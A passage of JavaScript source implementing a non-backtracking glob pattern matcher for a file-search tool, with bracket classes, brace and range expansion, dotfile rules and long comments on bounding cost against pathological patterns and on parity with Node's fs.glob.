      tokens.push({ t: 'star' })
      i++
    } else if (c === '?') {
      tokens.push({ t: 'any' })
      i++
    } else if (c === '[') {
      const parsed = parseBracketExpr(seg, i)
      if (parsed) {
        // A bracket class only ever tests ONE character at a time (see
        // `advanceToken`'s 'class' arm) — a single-char regex test can never
        // backtrack, so reusing RegExp here for the class body is safe,
        // unlike compiling the WHOLE segment (including `*`/`?` runs) to one.
        //
        // #7898 round 3 — `parseBracketExpr` accepts any `-`-range TEXT
        // (`[z-a]`, `[9-0]`, `[b-!a!x]` from combining adjacent special
        // characters) without checking the range is in order; JS's `RegExp`
        // constructor rejects an out-of-order range (`Range out of order in
        // character class`) and THROWS, synchronously, from inside
        // `compileCaseCheck` — which runs unconditionally, for every Glob
        // call whose pattern has a bracket segment, before a single directory
        // entry is even read (`runGlob` calls it up front). Nothing between
        // here and `executeBuiltinTool` catches it, so an ordinary "No
        // matches" (confirmed empirically: `fs.glob` itself tolerates
        // `[z-a]bc.ts` and simply matches nothing, it does not throw) turns
        // into a surfaced `Tool Glob failed: Invalid regular expression...`
        // error instead. Fail closed the same way an unclosed `[` or a
        // malformed segment already does elsewhere in this parser: a bracket
        // expression JS cannot compile becomes a token that matches no
        // character, ever — never a crash.
        let re
        try {
          re = new RegExp(`^${parsed.source}$`)
        } catch {
          tokens.push({ t: 'none' })
          i = parsed.next
          continue
        }
        tokens.push({ t: 'class', re, soleDot: parsed.soleDot })
        i = parsed.next
      } else {
        tokens.push({ t: 'lit', ch: '[' })
        i++
      }
    } else if (c === '{') {
      closeTable ??= braceCloseTable(seg)
      const close = closeTable[i]
      if (close === -1) {
        tokens.push({ t: 'lit', ch: '{' })
        i++
      } else {
        const alts = splitTopLevelCommas(seg.slice(i + 1, close))
        // #7951 — a matched `{...}` with NO top-level comma is NOT
        // alternation to `fs.glob` (verified directly: `{dup}` against a
        // real file named `dup` returns no matches, while a real file
        // literally named `{braces}.txt` IS matched by the pattern
        // `{braces}.txt` — same rule `expandBraces` already documents for
        // the slash-spanning path). Before this fix, EVERY matched brace
        // pair became an `alt` token regardless of comma count, so
        // `{dup}` wrongly matched `dup` and `brackets/{braces}.txt` missed
        // the real file entirely.
        //
        // Fix: only compile to `alt` when there is more than one
        // alternative. Otherwise treat the '{' as an ordinary literal
        // token and let THIS SAME loop keep scanning its interior
        // normally — a wildcard/bracket-class inside still functions
        // (`{a*}` still lets `*` match), and a NESTED brace group that
        // DOES have its own top-level comma still expands when the loop
        // reaches it (only the braces immediately enclosing a comma-less
        // body are literal, not everything inside them) — matching
        // `expandBraces`'s "anything expandable nested inside it still
        // expands" rule exactly. The matching '}' is reached later by
        // this same loop's `else` branch, which already treats a bare
        // '}' as a literal character.
        if (alts.length > 1) {
          tokens.push({ t: 'alt', options: alts.map(parseSegmentTokens) })
          i = close + 1
        } else {
          tokens.push({ t: 'lit', ch: '{' })
          i++
        }
      }
    } else {
      tokens.push({ t: 'lit', ch: c })
      i++
    }
  }
  return tokens
}

/**
 * Advance a SET of reachable string offsets in `str` through one
 * {@link parseSegmentTokens} token, without backtracking:
 *   - `lit`/`any`/`class` consume exactly one character from each reachable
 *     offset (O(|reachable|) work — never more than `str.length` offsets are
 *     ever live at once, so this cannot blow up regardless of how the
 *     pattern is shaped).
 *   - `star` matches zero or more characters: once ANY offset is reachable,
 *     every LATER offset becomes reachable too, computed as a prefix-OR scan
 *     from the minimum reachable offset (the same trick {@link caseCheckPasses}
 *     already uses for `**` one level up, here per character) — O(str.length),
 *     never an inner retry loop.
 *   - `alt` (a `{a,b}` brace) tries each alternative from the WHOLE reachable
 *     set at once via a single nested {@link advanceTokens} call per option,
 *     and unions the results — bounded by (alternatives) × (that
 *     alternative's own cost), which is O(str.length) per option regardless
 *     of |reachable|, for the same reason `star` above is: `advanceToken` is
 *     a function that COMMUTES with set union (`f(A ∪ B) = f(A) ∪ f(B)` for
 *     every token type, `star` included — its output only depends on
 *     `min(reachable)`, and `min(A ∪ B) = min(min(A), min(B))`), so feeding
 *     an option the FULL reachable set in one call is provably identical to
 *     feeding it each singleton `{j}` separately and unioning — just without
 *     redoing the option's own O(str.length) work once per `j`.
 *
 *     #7898 round 3 — this used to loop `for (const j of reachable) { for
 *     (const option ...) { advanceTokens(option, str, new Set([j])) } }`,
 *     recomputing each option from scratch for every individual reachable
 *     offset. That is the same shape of accidental quadratic blowup the
 *     `star` fix above exists to avoid, just one level up: a segment built
 *     from L sequential `{*a,*b}`-shaped groups (an ordinary, unremarkable
 *     glob shape — `{*.ts,*.js}` is a completely normal pattern) pays
 *     O(|reachable|) = O(str.length) extra work at EVERY such group, because
 *     each group's own `*` re-expands reachable back to near-`str.length`
 *     before the next group starts. Measured on the un-batched version: a
 *     20×`{*a,*b}` pattern (140 chars) against a 5000-char non-matching real
 *     segment took 12.96 SECONDS; even bounded to a filesystem-realistic
 *     255-byte name, 100 sequential groups (a 700-char pattern, well within
 *     what an attacker can type — nothing upstream caps `pattern` length)
 *     already exceeded 100ms. `compileCaseCheck`/`caseCheckPasses` run
 *     SYNCHRONOUSLY per Glob match (up to `GLOB_COLLECT_CEILING` = 50,000 of
 *     them), after `runGlob`'s own walk-timeout race has already resolved —
 *     the exact single-threaded-event-loop-freeze shape `ccd677c4b` (this
 *     same PR, one commit up) replaced a backtracking RegExp to eliminate,
 *     reintroduced here through the one branch that still had an
 *     |reachable|-proportional term. Batching removes it: this function is
 *     now O(str.length) worst case for every token type, `alt` included.
 *
 * DOT GUARD (#7901) — see parseSegmentTokens's DOT HANDLING doc. `dotGuarded`
 * is true exactly when `str` (the REAL segment name being tested) starts with
 * a literal dot; the guard only ever changes behavior at offset 0, since
 * offset 0 becoming reachable at any LATER token means an earlier token
 * already legitimately consumed the leading dot, and every following
 * character is ordinary. It does not disturb the commutes-with-union property
 * the `alt` batching above relies on: whether 0 stays in a token's output
 * depends only on whether 0 was in its input, independent of anything else in
 * the set, so `f(A ∪ B) = f(A) ∪ f(B)` still holds token-type by token-type.
 */
function advanceToken(token, str, reachable) {
  const n = str.length
  const dotGuarded = n > 0 && str[0] === '.'
  if (token.t === 'star') {
    const next = new Set()
    let min = Infinity
    for (const j of reachable) {
      // #7910 review (item 4) — `*` is NEVER dot-entitled, not even with
      // zero width: dropping offset 0 outright (rather than keeping it
      // reachable via a zero-width self-loop, as an earlier cut did) is what
      // `parseSegmentTokens`'s own doc already promises ("only a LITERAL
      // leading `.` ... reaches a dotfile"). The zero-width carve-out this
      // replaces let a LATER dot-entitled literal consume the leading dot
      // AFTER the star had "passed through" it doing nothing — which made
      // `*.env` match a real `.env` (verified: Node 22's `glob()` returns no
      // matches for `*.env` against `.env`). Offset 0 becoming reachable via
      // a LATER token (one that legitimately consumed the dot itself) is
      // unaffected — this only ever drops offset 0 from THIS token's own
      // output.
      if (dotGuarded && j === 0) continue
      if (j < min) min = j
    }
    if (min !== Infinity) { for (let j = min; j <= n; j++) next.add(j) }
    return next
  }
  const next = new Set()
  if (token.t === 'alt') {
    for (const option of token.options) {
      for (const end of advanceTokens(option, str, reachable)) next.add(end)
    }
    return next
  }
  // A `lit` token whose own character is '.' is always entitled to consume
  // offset 0; a `class` token is entitled only when parseBracketExpr flagged
  // it `soleDot` (the `[.]` exception — see its doc). Every other token type
  // (`any`, an ordinary `class`) is never entitled, matching `fs.glob`'s own
  // default of never letting a bare wildcard stand for a leading dot.
  const dotEntitled = token.t === 'lit' ? token.ch === '.' : token.t === 'class' && token.soleDot === true
  for (const j of reachable) {
    if (j >= n) continue
    if (j === 0 && dotGuarded && !dotEntitled) continue
    const c = str[j]
    if (token.t === 'lit' && c === token.ch) next.add(j + 1)
    else if (token.t === 'any') next.add(j + 1)
    else if (token.t === 'class' && token.re.test(c)) next.add(j + 1)
    // `t: 'none'` (a bracket expression `parseSegmentTokens` could not
    // compile to a RegExp — see its try/catch) intentionally matches no
    // branch above: it consumes nothing, ever, for any character. Fail
    // closed, on purpose, not an omission.
  }
  return next
}

/** Run a whole {@link parseSegmentTokens} token array through {@link advanceToken}, in order. */
function advanceTokens(tokens, str, startReachable) {
  let reachable = startReachable
  for (const token of tokens) {
    reachable = advanceToken(token, str, reachable)
    if (reachable.size === 0) return reachable
  }
  return reachable
}

/**
 * Does a {@link parseSegmentTokens} token array match `str` exactly, start to
 * end (case-sensitively — `lit` compares characters with `===`)? The safe,
 * non-backtracking replacement for `new RegExp(...).test(str)`.
 */
function segmentMatches(tokens, str) {
  const end = advanceTokens(tokens, str, new Set([0]))
  return end.has(str.length)
}

/**
 * Parse a `[...]` bracket expression starting at `seg[openIdx] === '['`.
 * Returns `null` (caller treats `[` as a literal) when there is no closing
 * `]` — the same "unmatched metachar is literal" rule glob implementations
 * use. A `]` immediately after `[` or `[!`/`[^` is a literal `]`, per POSIX.
 *
 * `soleDot` (#7901) — true exactly when this class is `[.]`: non-negated,
 * one member, that member a literal dot. Node's `fs.glob` gives this one
 * shape of bracket class the same "explicit dot" privilege as a bare literal
 * `.` (verified directly: `[.]env` matches a real `.env`), while every other
 * class — `[.a]`, `[a.]`, any negated class, `.` on a `-` end of a range —
 * does not, even when `.` is technically among the characters it accepts. See
 * parseSegmentTokens's DOT HANDLING doc and advanceToken's dot guard, which
 * is the only place this flag is read.
 */
function parseBracketExpr(seg, openIdx) {
  let j = openIdx + 1
  let negate = false
  if (seg[j] === '!' || seg[j] === '^') {
    negate = true
    j++
  }
  const start = j
  if (seg[j] === ']') j++
  // #7918 review — the native `indexOf` rather than a JS loop: same answer
  // (the first `]` at or after `j`, or none), but a run of unclosed `[` costs
  // one full scan per `[` either way, and #7918's brace expansion can hand
  // up to GLOB_BRACE_EXPANSION_CAP patterns to `compileCaseCheck` per call,
  // so the constant factor of that quadratic is no longer paid once.
  j = seg.indexOf(']', j)
  if (j === -1) return null
  const body = seg.slice(start, j)
  if (body.length === 0) return null
  // '-' is left alone (ranges mean the same thing in a JS class); '^' and ']'
  // are escaped so an unlucky position (leading '^', an already-consumed
  // leading ']') can't be misread as class syntax.
  const classBody = body.replace(/\^/g, '\\^').replace(/\]/g, '\\]')
  return { source: `[${negate ? '^' : ''}${classBody}]`, next: j + 1, soleDot: !negate && body === '.' }
}

/**
 * `closeOf[i]` — the index of the `}` matching a `{` at `i` in `seg`, or -1
 * when that `{` is unmatched (or `seg[i]` is not a `{`). One left-to-right
 * stack pass, so a matched pair is exactly the `{`/`}` a forward depth count
 * from `i` would stop at.
 *
 * #7951 — bracket-expression AWARE: a `{`/`}` inside a `[...]` class is a
 * class member, not brace syntax, so `{[}]a,b}`'s embedded `}` does not end
 * the group early. This is THIS MODULE'S rule, kept identical to
 * {@link expandBraces}'s pass-1 pairing so the per-segment and whole-pattern
 * paths never disagree on where a group ends. It is NOT a claim about
 * `fs.glob`: its brace expansion (`brace-expansion`'s `balanced-match`) knows
 * nothing about brackets at all. The two agree on `{a[}]b,fc}` (both yield
 * the alternatives `a[}]b` and `fc`) only because `brace-expansion` has a
 * separate rule that re-pairs a comma-less group's `}` as literal when a
 * `,…}` follows it — and they disagree on `{a,b[}]c}`, where `fs.glob` closes
 * the group at the bracketed `}`. The parity harness pins those shapes in
 * its #7951 known-difference bucket rather than claiming a parity that does
 * not hold.
 *
 * COST (#7951 review) — the previous per-`{` forward scan re-parsed every
 * bracket expression after that `{` on every call. A `{` that bracket-aware
 * pairing leaves unmatched (`{[}]`) scans to the end of the segment, and an
 * unclosed `[` costs a full `indexOf` to the end each time it is re-parsed.
 * Even held to 30 such `{` (under the host depth ceiling in `runGlob`),
 * `'{1..999}' + '{[}]'.repeat(30) + '['.repeat(1870)` cost ~2.2ms per
 * compile, times the 999 patterns `runGlob` compiles: 2.1s of CPU for one
 * Glob call, against ~90ms with this table (origin/main, pairing
 * bracket-oblivious, did not expand ranges at all). One pass per segment costs what
 * {@link parseSegmentTokens}'s own loop already costs (it too calls
 * {@link parseBracketExpr} at every `[`), whatever the number of `{`.
 */
function braceCloseTable(seg) {
  const n = seg.length
  const closeOf = new Int32Array(n).fill(-1)
  const stack = []
  let j = 0
  while (j < n) {
    const c = seg[j]
    if (c === '[') {
      const parsed = parseBracketExpr(seg, j)
      if (parsed) { j = parsed.next; continue }
    }
    if (c === '{') stack.push(j)
    else if (c === '}' && stack.length > 0) closeOf[stack.pop()] = j
    j++
  }
  return closeOf
}

/**
 * The deepest `{` nesting {@link braceCloseTable}'s pairing reaches in `s` —
 * the same scan, keeping only the stack height. Every recursion
 * {@link parseSegmentTokens} and `advanceToken` perform is on a pair this
 * scan counts (and an unmatched `{` only raises it), so it is an upper bound
 * on their depth, which the bracket-oblivious `globPatternComplexityReason`
 * counter is not for this parser (see `runGlob`'s #7951 review note).
 *
 * `lastClose`: `runGlob` runs this over EVERY expanded pattern before the
 * walk, synchronously. An unclosed `[` costs {@link parseBracketExpr} a full
 * `indexOf` to the end, so a run of them is quadratic per pattern — measured
 * ~70ms for the 999 expansions of `{1..999}` + 1,990 `[`, against ~4ms when
 * every `[` after the last `]` is skipped (it cannot open a class: no `]`
 * follows it, so `parseBracketExpr` would return null anyway).
 */
function hostBraceNestingDepth(s) {
  const lastClose = s.lastIndexOf(']')
  let depth = 0
  let max = 0
  let j = 0
  while (j < s.length) {
    const c = s[j]
    if (c === '[' && j < lastClose) {
      const parsed = parseBracketExpr(s, j)
      if (parsed) { j = parsed.next; continue }
    }
    if (c === '{') { depth++; if (depth > max) max = depth }
    else if (c === '}' && depth > 0) depth--
    j++
  }
  return max
}

/**
 * True when some `/`-segment of `pattern` — what `compileCaseCheck` hands to
 * {@link parseSegmentTokens} — nests braces deeper than
 * `GLOB_PATTERN_MAX_BRACE_DEPTH` as this host pairs them. ({@link expandBraces}
 * also recurses per nesting level, over the whole pattern, but it recurses
 * only on EXPANDING groups, one small frame each, and on origin/main it was
 * already bracket-aware; the parser and matcher are the deep frames.)
 */
function hostBraceDepthExceeded(pattern) {
  for (const seg of pattern.split('/')) {
    if (hostBraceNestingDepth(seg) > GLOB_PATTERN_MAX_BRACE_DEPTH) return true
  }
  return false
}

/**
 * Split a `{a,b,c}` body on top-level commas (commas inside nested `{}` don't
 * count). Two DIFFERENT bracket-awarenesses on purpose, matching
 * {@link braceCloseTable}/{@link expandBraces}'s own pass-1 exactly:
 *   - bracket-AWARE for nested-`{`/`}` DEPTH — a `{` or `}` inside a `[...]`
 *     class is a class member, never nested-brace syntax, so it must not
 *     perturb `depth` (an embedded `}`, e.g. the one inside `[}]`, would
 *     otherwise look like it closes a nested group that was never opened).
 *   - bracket-OBLIVIOUS for COMMAS — a comma inside a `[...]` class still
 *     splits, matching `fs.glob`'s own measured behavior exactly (`{a[,]b,c}`
 *     against real files named `a[`, `]b`, `c` matches all three; `{p[,q]r,s}`
 *     similarly splits 3 ways, not the 2 a bracket-aware split would give).
 * So a bracket span is scanned character-by-character for a comma (never
 * jumped over outright) while still being skipped for depth purposes.
 */
function splitTopLevelCommas(s) {
  const parts = []
  let depth = 0
  let start = 0
  let i = 0
  while (i < s.length) {
    if (s[i] === '[') {
      const parsed = parseBracketExpr(s, i)
      if (parsed) {
        for (let k = i; k < parsed.next; k++) {
          if (s[k] === ',' && depth === 0) {
            parts.push(s.slice(start, k))
            start = k + 1
          }
        }
        i = parsed.next
        continue
      }
    }
    if (s[i] === '{') depth++
    else if (s[i] === '}') depth--
    else if (s[i] === ',' && depth === 0) {
      parts.push(s.slice(start, i))
      start = i + 1
    }
    i++
  }
  parts.push(s.slice(start))
  return parts
}

/**
 * #7918 — cheap pre-check: does `pattern` contain a `/` character inside ANY
 * `{...}` group, at any nesting depth? When it does not, whole-pattern brace
 * expansion has nothing to offer over the existing per-segment `alt`-token
 * compiler — which is the common case (`*.{ts,js}`, `{a,b,c}/**`) and already
 * handles it in ONE walk with batched O(N) cost per option (see
 * `advanceToken`'s `alt` doc), a walk the general expand-then-union path below
 * cannot match: expanding an ordinary NON-spanning brace into separate
 * top-to-bottom tree walks would turn an ordinary chained-braces pattern into
 * a combinatorial fan-out of full walks, for a capability it never needed.
 * This gate keeps every such pattern on the fast, existing, already-tested
 * path — {@link expandBraces} only runs when this returns `true`.
 */
function hasSlashSpanningBrace(pattern) {
  let i = 0
  let braceDepth = 0
  while (i < pattern.length) {
    const c = pattern[i]
    if (c === '[') {
      const parsed = parseBracketExpr(pattern, i)
      if (parsed) { i = parsed.next; continue }
    }
    if (c === '{') braceDepth++
    else if (c === '}') { if (braceDepth > 0) braceDepth-- }
    else if (c === '/' && braceDepth > 0) return true
    i++
  }
  return false
}

/**
 * #7918 — BOUND on the whole-pattern brace expansion {@link hasSlashSpanningBrace}
 * gates: the pattern's own length and brace-nesting-depth caps
 * (`globPatternComplexityReason`, 2,000 chars / 32 levels) do not, by
 * themselves, bound the number of alternative STRINGS a chain of sibling
 * brace groups can expand to (`{a,b}{c,d}{e,f}...` — each additional group
 * multiplies the count, so a ~30-group chain well within the length cap
 * would already exceed a million). {@link expandBraces} computes the exact
 * expansion count FIRST, in one linear pass that saturates at
 * `GLOB_BRACE_EXPANSION_CAP + 1`, and refuses (returns `null`) before a single
 * alternative string is built when the count is over — never a partial
 * expansion, never a silent truncation.
 */
const GLOB_BRACE_EXPANSION_CAP = 1000

/**
 * #7951 — matches a `{X..Y}` / `{X..Y..S}` "sequence expression" group body
 * (the text strictly between `{` and its matching `}`) the same shape
 * `fs.glob` recognizes — verified directly: `{1..3}` → 1,2,3; `{01..03}` →
 * zero-padded; `{a..c}` → a,b,c; `{3..1}`/`{c..a}` → descending; `{1..10..2}`
 * → stepped. `$`-anchored on both alternatives: a stray extra character,
 * including a comma, fails both and falls through to ordinary comma-group /
 * literal handling — a range and a comma-alternation are mutually exclusive
 * by construction, never a precedence question.
 *
 * Two shapes only: an optionally-signed decimal integer on both sides
 * (optionally-signed decimal step), or a single ASCII letter on both sides
 * (same optional step). A NON-letter, non-digit single-character endpoint
 * (`{^..a}`) is deliberately NOT recognized as a range here — a narrower
 * scope than a hypothetical arbitrary-code-point walk, chosen because no
 * real Glob call needs a punctuation-to-punctuation range. `fs.glob`'s own
 * `brace-expansion` uses these same two regexes (read from Node 22's bundled
 * copy), so `{[..]}` is not a range there either: both leave it literal and
 * hand `[..]` to the class parser.
 */
const GLOB_BRACE_RANGE_RE = /^(-?\d+)\.\.(-?\d+)(?:\.\.(-?\d+))?$|^([A-Za-z])\.\.([A-Za-z])(?:\.\.(-?\d+))?$/

/**
 * Parse a range GROUP BODY against {@link GLOB_BRACE_RANGE_RE}. Returns
 * `null` when the body does not match, OR when it matches but the step is
 * zero (`{1..10..0}`) — which `fs.glob` itself does not fail gracefully for
 * (measured directly: it THROWS `RangeError: Invalid array length`,
 * synchronously, from inside its own iterator, not a "no matches" result).
 * Refusing to treat a zero step as a range at all — falling back to ordinary
 * literal `{...}` handling, the same as any other non-range body — is a
 * deliberate divergence: this module never throws synchronously out of
 * pattern compilation for attacker-controlled input. The permanent parity
 * harness (byok-glob-fs-glob-parity.test.js) deliberately excludes a
 * zero-step pattern from its oracle-based table for the same reason ITS
 * oracle call would crash outright — see that file's comment on the `range/`
 * pattern block; byok-tool-executor.test.js's "range expansion (#7951)"
 * describe block pins the fail-closed behavior directly instead.
 *
 * Returns `{ count, nth(k) }` on success. `count` is computed ARITHMETICALLY
 * — no iteration, so it stays cheap for a range far too large to ever
 * materialize (`{1..999999999999}`) — and `nth(k)` (0-indexed) lazily
 * formats the k-th member. `nth` is only ever called by {@link expandBraces}'s
 * `build` pass, itself only reached once the WHOLE pattern's total expansion
 * count has already been proven `<= GLOB_BRACE_EXPANSION_CAP` — the same
 * count-before-materialize discipline #7945 established for comma groups.
 * A count of exactly 1 (`{5..5}`, `{1..3..5}`) is still an expansion: the
 * braces and the `..` are replaced by the one member.
 *
 * EXACT INTEGERS (#7951 review) — a numeric range is computed in BigInt, not
 * Number. `\d+` has no length limit, and in float arithmetic two equal
 * 400-digit endpoints are both `Infinity`, so `end - start` is `NaN` and the
 * count was `NaN`: every `>= cap` comparison false, and the group silently
 * expanded to NOTHING (a "No matches" for a pattern that names a real file).
 * Past 2^53 a float also rounds (`9007199254740993` → `...992`) and prints
 * in exponent form (`1e+21`). BigInt keeps every endpoint, step, count and
 * member exact at any length, for ~0.04ms at 2,000 digits. `fs.glob` itself
 * uses float arithmetic and THROWS `RangeError: Invalid array length` on
 * these shapes (its loop stops advancing once `i + step === i`), so there is
 * no oracle answer to match; the exact expansion is the one bash gives.
 *
 * PADDING (verified directly against `fs.glob`, and read from its bundled
 * `brace-expansion`: `pad = n.some(isPadded)` over ALL THREE parts, width
 * from the two endpoints only): when any of start, end or step has a leading
 * zero after its optional sign (`/^-?0\d/` — a lone `"0"` does not count, it
 * has no second digit to pad), every generated member is zero-padded so its
 * own printed length (sign included) equals the WIDER of the two endpoints'
 * own printed lengths: `{001..10}` and `{1..010}` both produce
 * `001, 002, ... 010` (width 3, from whichever side is wider),
 * `{1..10..01}` produces `01, 02, ... 10` (the padded STEP turns padding on;
 * width 2 comes from `10`), and `{-01..1}` produces `-01, 000, 001` (width 3
 * — the `-` counts toward the width, so a positive member gets one more zero
 * than the padded positive endpoint's own digit count).
 *
 * LETTER RANGES: both endpoints must independently be a single ASCII letter
 * — mixed case is legal (verified: `{a..C}` and `{Z..a}` both expand). The
 * walk is a raw UTF-16 code-unit step between the two endpoints inclusive,
 * matching `fs.glob`'s own observed behavior even when it steps through
 * non-letter code points in between a mixed-case pair (`{Z..a}` yields
 * `Z [ ] ^ _ ` a` plus one EMPTY member): the backslash code point becomes
 * an empty string, exactly as `brace-expansion` does (`if (c === '\\') c = ''`
 * — verified: `x{Z..a}y` matches a real `xy` and never a real `x\y`). A range
 * member can therefore be empty, so `.{Z..a}.` produces a `..` text segment;
 * that is harmless here because {@link walkGlob} only ever descends into
 * entries `opendir` returns, and `opendir` never returns `.` or `..`.
 */
function parseRangeGroup(body) {
  const m = GLOB_BRACE_RANGE_RE.exec(body)
  if (!m) return null
  if (m[1] !== undefined) {
    const startRaw = m[1]
    const endRaw = m[2]
    const stepRaw = m[3]
    const start = BigInt(startRaw)
    const end = BigInt(endRaw)
    const signedStep = stepRaw === undefined ? 1n : BigInt(stepRaw)
    const step = signedStep < 0n ? -signedStep : signedStep
    if (step === 0n) return null // refuse, never divide by zero — see the doc above
    const padded = [startRaw, endRaw, stepRaw].some((s) => s !== undefined && /^-?0\d/.test(s))
    const width = padded ? Math.max(startRaw.length, endRaw.length) : 0
    const dir = end >= start ? 1n : -1n
    const span = end >= start ? end - start : start - end
    // Exact as a BigInt; as a Number it is exact up to 2^53 and only ever
    // compared against the cap beyond that (never NaN — at worst Infinity).
    const count = Number(span / step + 1n)
    return {
      count,
      nth(k) {
        const val = start + dir * step * BigInt(k)
        const sign = val < 0n ? '-' : ''
        const digits = (val < 0n ? -val : val).toString()
        return sign + (padded ? digits.padStart(Math.max(0, width - sign.length), '0') : digits)
      },
    }
  }
  const startCh = m[4]
  const endCh = m[5]
  const stepRaw = m[6]
  const rawStep = stepRaw === undefined ? 1 : Math.abs(Number(stepRaw))
  if (!(rawStep > 0)) return null
  // Two letters are at most 57 code units apart ('A'..'z'), so any step past
  // that yields the start alone. Clamping keeps `step * k` finite: a 400-digit
  // step is `Infinity` as a Number, and `Infinity * 0` is NaN, which made
  // `nth(0)` a NUL character instead of the start letter (#7951 review).
  const step = Math.min(rawStep, 64)
  const startCode = startCh.charCodeAt(0)
  const endCode = endCh.charCodeAt(0)
  const dir = endCode >= startCode ? 1 : -1
  const count = Math.floor(Math.abs(endCode - startCode) / step) + 1
  return {
    count,
    nth(k) {
      const ch = String.fromCharCode(startCode + dir * step * k)
      return ch === '\\' ? '' : ch
    },
  }
}

/**
 * #7951 — cheap pre-check, the same shape as {@link hasSlashSpanningBrace}:
 * does `pattern` contain a brace GROUP (bracket-expression-aware, matching
 * {@link expandBraces}'s own group-boundary scan) whose body is shaped like a
 * `{X..Y}` / `{X..Y..S}` range? A range has no representation in the
 * per-segment `alt`-token compiler (`parseSegmentTokens` never expands
 * `..`), so — like a slash-spanning brace — it needs the whole-pattern
 * expand-then-union path {@link expandBraces} provides. This tests only the
 * SHAPE via {@link GLOB_BRACE_RANGE_RE}; a shape {@link parseRangeGroup}
 * later refuses for its own reasons (a zero step) is still routed to
 * `expandBraces` and simply falls back to literal `{...}` text there — a
 * wasted gate trigger, never a correctness gap.
 *
 * The bracket skip below (#7951 review) makes the gate's notion of a group
 * EXACTLY `expandBraces`'s: `x[{1..3}]` is a bracket expression, not a range,
 * to both. Without the skip the gate would be a strict superset (it would
 * fire on `x[{1..3}]`, and `expandBraces` would hand the pattern back
 * unchanged), so the skip changes cost, not results — which is why it is
 * pinned by a direct call to this function and cannot be pinned through Glob.
 */
function hasRangeBrace(pattern) {
  let i = 0
  const starts = []
  while (i < pattern.length) {
    const c = pattern[i]
    if (c === '[') {
      const parsed = parseBracketExpr(pattern, i)
      if (parsed) { i = parsed.next; continue }
    }
    if (c === '{') {
      starts.push(i + 1)
    } else if (c === '}') {
      if (starts.length > 0) {
        const start = starts.pop()
        if (GLOB_BRACE_RANGE_RE.test(pattern.slice(start, i))) return true
      }
    }
    i++
  }
  return false
}

/**
 * #7918 — expand every brace GROUP in the raw `pattern`, globally (before any
 * `/`-split), into its alternative combinations. `compileCaseCheck` splits on
 * `/` before parsing braces at all, so `{a,b/c}` (a brace alternative whose
 * OPTIONS themselves contain `/`) has no representation in the compiled
 * per-segment matcher — a real capability loss versus pre-#7910 `main`, which
 * called `fs.glob` directly and got its native, slash-spanning brace expansion
 * for free. Each returned string is compiled and walked independently by
 * {@link runGlob}, results unioned.
 *
 * WHAT IS A GROUP: a `{` paired with its `}` by one left-to-right scan that
 * skips bracket expressions exactly as {@link parseBracketExpr} delimits them
 * for the PAIRING itself (a `{` or `}` inside `[...]` is a class member, not
 * brace syntax — the same rule as the per-segment {@link braceCloseTable}, so
 * the two paths agree on where a group ends; `fs.glob`'s brace expansion is
 * bracket-oblivious and agrees only on some shapes — see that function's doc
 * and the parity harness's #7951 known-difference bucket). Its alternatives
 * are either:
 *   - the top-level-comma-separated pieces of the body, each expanded
 *     recursively — #7951: comma-splitting is deliberately bracket-OBLIVIOUS
 *     (the opposite awareness from pairing), matching `fs.glob`'s own
 *     measured behavior exactly (`{a[,]b,c}` against real files named `a[`,
 *     `]b`, `c` matches all three — a bracket-aware split would only ever
 *     see 2 alternatives, not 3); or
 *   - the members of a `{X..Y}` / `{X..Y..S}` range (#7951, when the body has
 *     no top-level comma and matches {@link GLOB_BRACE_RANGE_RE} — see
 *     {@link parseRangeGroup}).
 * Sibling groups multiply. An unmatched `{` is a literal. A matched `{...}`
 * with neither a top-level comma nor a valid range body (`{x}`,
 * `{nested/dup}`) is NOT expanded here — its braces stay in the output
 * verbatim (anything expandable nested inside it still expands) — which is
 * `fs.glob`'s own rule (its brace expansion leaves `{nested/dup}` alone, so
 * it names a literal `{nested`/`dup}` path) and exactly what pre-#7918 code
 * did with such a pattern: the per-segment compiler still sees the same text
 * it always saw (see that compiler's own #7951 fix for the same rule).
 *
 * COST (review of #7918, extended by #7951's range support) — this runs
 * synchronously on the daemon's event loop, where the walk's deadline race
 * cannot interrupt it, so it must be bounded by the pattern's LENGTH, not by
 * what the pattern expands to. The first implementation re-scanned every
 * candidate string from its start once per brace group, calling
 * `parseBracketExpr` (an O(n) scan to the next `]`) at every `[` it passed:
 * O(groups × strings × n²). Measured on a 1,998-char pattern well inside
 * every existing cap (a run of unclosed `[`, eight two-way groups plus one
 * slash-spanning one, then ~330 one-option `{q}` groups), that was 292
 * SECONDS of blocked event loop — every session, every WebSocket client, the
 * tunnel health checks, frozen. Now: one O(n) pass pairs braces and records
 * each group's top-level commas (a bracket expression's end is an O(1)
 * lookup in a precomputed next-`]` table instead of a scan), one O(n) pass
 * computes the exact count — for a range group this is one O(1) arithmetic
 * division, NEVER a loop over the range's own members, so `{1..100000}` and
 * `{a..z}{a..z}{a..z}` cost the same handful of operations as `{1..2}` — and
 * that pass saturates at `GLOB_BRACE_EXPANSION_CAP + 1` no matter how the
 * cap is approached (comma multiplication or range arithmetic), and only an
 * under-cap pattern is materialized, at O(count × n) — at most 1,000 strings
 * of at most 2,000 characters.
 *
 * @param {string} pattern
 * @returns {string[]|null} The expanded patterns (`[pattern]` when nothing
 *   expands), or `null` when there would be more than
 *   {@link GLOB_BRACE_EXPANSION_CAP}.
 */
function expandBraces(pattern) {
  const n = pattern.length
  // nextClose[j] — index of the first ']' at or after j, or -1.
  const nextClose = new Int32Array(n + 1)
  nextClose[n] = -1
  for (let j = n - 1; j >= 0; j--) nextClose[j] = pattern[j] === ']' ? j : nextClose[j + 1]
  // Exactly `parseBracketExpr(pattern, i)?.next ?? -1`, in O(1): same
  // optional `!`/`^`, same leading-`]`-is-a-member rule, same "no closing
  // `]`" and "empty body" nulls.
  const bracketEnd = (i) => {
    let j = i + 1
    if (pattern[j] === '!' || pattern[j] === '^') j++
    const start = j
    if (pattern[j] === ']') j++
    if (j >= n) return -1
    const close = nextClose[j]
    return close === -1 || close === start ? -1 : close + 1
  }

  // Pass 1 — pair every '{' with its '}' (BRACKET-AWARE: a `[...]` span is
  // skipped so any `{`/`}` inside it never affects pairing/depth — #7951)
  // and record each group's top-level commas (BRACKET-OBLIVIOUS: a comma
  // inside a `[...]` span still counts, matching `fs.glob` — #7951, see
  // `expandBraces`'s own doc above). The two awarenesses are opposite on
  // purpose, so a `[...]` span is scanned character-by-character for a `,`
  // instead of being jumped over outright, even though it IS still jumped
  // over for the purpose of `{`/`}` structural matching.
  const closeOf = new Int32Array(n).fill(-1)
  const commasOf = new Map()
  const stack = []
  for (let i = 0; i < n;) {
    const c = pattern[i]
    if (c === '[') {
